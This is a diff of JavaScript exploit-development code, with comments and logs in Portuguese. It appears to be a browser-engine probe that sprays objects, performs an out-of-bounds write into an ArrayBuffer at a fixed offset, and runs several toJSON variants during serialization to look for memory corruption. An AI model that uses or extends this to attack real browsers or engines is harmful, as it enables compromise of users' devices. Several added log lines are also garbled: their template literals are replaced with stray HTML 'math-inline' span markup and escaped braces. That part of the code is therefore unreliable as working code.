@@ -21,18 +21,18 @@ class MyComplexObjectForRangeError {
 }
 
 export const toJSON_RangeErrorVariants = {
-    V0_EmptyReturn: function() { /* ... (como antes) ... */
+    V0_EmptyReturn: function() {
         return { variant: "V0_EmptyReturn" };
     },
-    V1_AccessThisId: function() { /* ... (como antes) ... */
+    V1_AccessThisId: function() {
         try { return { variant: "V1_AccessThisId", id: String(this.id).substring(0,50) }; }
         catch (e) { return { variant: "V1_AccessThisId", error: `${e.name}: ${e.message}` }; }
     },
-    V2_ToStringCallThis: function() { /* ... (como antes) ... */
+    V2_ToStringCallThis: function() {
         try { return { variant: "V2_ToStringCallThis", type: Object.prototype.toString.call(this) }; }
         catch (e) { return { variant: "V2_ToStringCallThis", error: `${e.name}: ${e.message}` }; }
     },
-    V3_LoopInEmpty_Limited: function() { /* ... (como antes) ... */
+    V3_LoopInEmpty_Limited: function() { 
         let count = 0;
         try {
             for (const p in this) {
@@ -46,21 +46,24 @@ export const toJSON_RangeErrorVariants = {
             return { variant: "V3_LoopInEmpty_Limited", error: e.message, count_at_error: count };
         }
     },
+    V4_Dummy: function() { 
+        logS3("   [V4_Dummy toJSON] Chamada.", "info", "V4_Dummy");
+        return { variant: "V4_Dummy", message: "Corpo vazio, apenas para testar a definição."};
+    },
     V4_LoopInWithAccess_Limited: function() { 
         let props = {}; let count = 0;
         const FNAME_toJSON_Internal = "V4_LoopInWithAccess_Limited";
         let last_prop_attempted_log = "N/A_LoopStart";
-        // LOG NO INÍCIO DA FUNÇÃO toJSON
         logS3(`   [${FNAME_toJSON_Internal}] FUNÇÃO toJSON INICIADA (ID do this: ${this ? this.id : "N/A"}).`, "info", FNAME_toJSON_Internal);
         try {
             logS3(`   [${FNAME_toJSON_Internal}] Iniciando loop for...in...`, "info", FNAME_toJSON_Internal);
             for (const p in this) {
                 count++;
                 last_prop_attempted_log = p;
-                logS3(`     [${FNAME_toJSON_Internal}] Loop ${count}: Tentando acessar prop '${p}'...`, "info", FNAME_toJSON_Internal);
+                logS3(`     [${FNAME_toJSON_Internal}] Loop <span class="math-inline">\{count\}\: Tentando acessar prop '</span>{p}'...`, "info", FNAME_toJSON_Internal);
                 const val = this[p]; 
                 props[p] = (typeof val === 'function') ? "[Function]" : String(val).substring(0, 30);
-                logS3(`       [${FNAME_toJSON_Internal}] Prop '${p}' acessada. Valor (truncado): ${props[p]}`, "info", FNAME_toJSON_Internal);
+                logS3(`       [<span class="math-inline">\{FNAME\_toJSON\_Internal\}\] Prop '</span>{p}' acessada. Valor (truncado): ${props[p]}`, "info", FNAME_toJSON_Internal);
                 if (count > 100) {
                     logS3(`     [${FNAME_toJSON_Internal}] Limite de iteração (100) atingido.`, "warn", FNAME_toJSON_Internal);
                     props['...'] = "truncated_loop"; break;
@@ -68,15 +71,11 @@ export const toJSON_RangeErrorVariants = {
             }
             return { variant: FNAME_toJSON_Internal, props: props, count: count, last_prop_attempted: last_prop_attempted_log };
         } catch (e) {
-            logS3(`     [${FNAME_toJSON_Internal}] ERRO dentro do loop for...in ao processar prop '${last_prop_attempted_log}': ${e.name} - ${e.message}`, "error", FNAME_toJSON_Internal);
+            logS3(`     [<span class="math-inline">\{FNAME\_toJSON\_Internal\}\] ERRO dentro do loop for\.\.\.in ao processar prop '</span>{last_prop_attempted_log}': ${e.name} - ${e.message}`, "error", FNAME_toJSON_Internal);
             return { variant: FNAME_toJSON_Internal, error: `${e.name}: ${e.message}`, props_collected: props, count_at_error: count, last_prop_attempted: last_prop_attempted_log };
         }
     },
-    V4_Dummy: function() { /* ... (como antes) ... */
-        logS3("   [V4_Dummy toJSON] Chamada.", "info", "V4_Dummy");
-        return { variant: "V4_Dummy", message: "Corpo vazio, apenas para testar a definição."};
-    },
-    V5_ObjectKeysThenAccess_Limited: function() { /* ... (como antes) ... */
+    V5_ObjectKeysThenAccess_Limited: function() { 
         let props = {}; let keys = []; let count = 0;
         const FNAME_toJSON_Internal = "V5_ObjectKeysThenAccess_Limited";
         let last_prop_attempted_log = "N/A_LoopStart_ObjectKeys";
@@ -87,11 +86,11 @@ export const toJSON_RangeErrorVariants = {
             for (const p of keys) {
                 count++;
                 last_prop_attempted_log = p;
-                logS3(`     [${FNAME_toJSON_Internal}] Loop ${count}/${keys.length}: Tentando acessar this['${p}']...`, "info", FNAME_toJSON_Internal);
+                logS3(`     [${FNAME_toJSON_Internal}] Loop <span class="math-inline">\{count\}/</span>{keys.length}: Tentando acessar this['${p}']...`, "info", FNAME_toJSON_Internal);
                 const val = this[p];
                 try { props[p] = String(this[p]).substring(0, 30); }
                 catch(e_prop) { props[p] = `Error accessing prop ${p}: ${e_prop.name}`; }
-                logS3(`       [${FNAME_toJSON_Internal}] Prop '${p}' acessada. Valor (truncado): ${props[p]}`, "info", FNAME_toJSON_Internal);
+                logS3(`       [<span class="math-inline">\{FNAME\_toJSON\_Internal\}\] Prop '</span>{p}' acessada. Valor (truncado): ${props[p]}`, "info", FNAME_toJSON_Internal);
                 if (count > 100) {
                      logS3(`     [${FNAME_toJSON_Internal}] Limite de iteração (100) atingido.`, "warn", FNAME_toJSON_Internal);
                      props['...'] = "truncated_loop_ObjectKeys"; break;
@@ -99,7 +98,7 @@ export const toJSON_RangeErrorVariants = {
             }
             return { variant: FNAME_toJSON_Internal, props: props, num_keys: keys.length, count: count, last_prop_attempted: last_prop_attempted_log };
         } catch (e) {
-            logS3(`     [${FNAME_toJSON_Internal}] ERRO durante loop Object.keys ao processar prop '${last_prop_attempted_log}': ${e.name} - ${e.message}`, "error", FNAME_toJSON_Internal);
+            logS3(`     [<span class="math-inline">\{FNAME\_toJSON\_Internal\}\] ERRO durante loop Object\.keys ao processar prop '</span>{last_prop_attempted_log}': ${e.name} - ${e.message}`, "error", FNAME_toJSON_Internal);
             return { variant: FNAME_toJSON_Internal, error: `${e.name}: ${e.message}`, keys_collected: keys.length, props_collected: props, count_at_error: count, last_prop_attempted: last_prop_attempted_log };
         }
     }
@@ -109,11 +108,10 @@ export async function executeProbeComplexObjectWithMinimalToJSONs(
     toJSONFunctionToUse,
     toJSONFunctionName
 ) {
-    // LOG NO INÍCIO DESTA FUNÇÃO PARA VER SE ELA É CHAMADA
     const FNAME_TEST = `executeProbeComplexObj<${toJSONFunctionName}>`;
     logS3(`>>> [${FNAME_TEST}] INÍCIO DA FUNÇÃO. Usando ${toJSONFunctionName}. (PONTO DE VERIFICAÇÃO 0) <<<`, "test", FNAME_TEST);
 
-    const spray_count = 10; // Reduzido para focar
+    const spray_count = 10; 
     const sprayed_objects = [];
 
     const corruption_offset_in_oob_ab = 0x70;
@@ -135,7 +133,7 @@ export async function executeProbeComplexObjectWithMinimalToJSONs(
         return { error: new Error("OOB Setup Failed"), toJSON_name: toJSONFunctionName, stringifyResult: null };
     }
     try {
-        logS3(`  Escrevendo ${toHex(value_to_write_in_oob_ab)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "warn", FNAME_TEST);
+        logS3(`  Escrevendo <span class="math-inline">\{toHex\(value\_to\_write\_in\_oob\_ab\)\} em oob\_array\_buffer\_real\[</span>{toHex(corruption_offset_in_oob_ab)}]...`, "warn", FNAME_TEST);
         oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
         logS3("  Escrita OOB feita. (PONTO DE VERIFICAÇÃO 1)", "info", FNAME_TEST);
     } catch (e_write) {
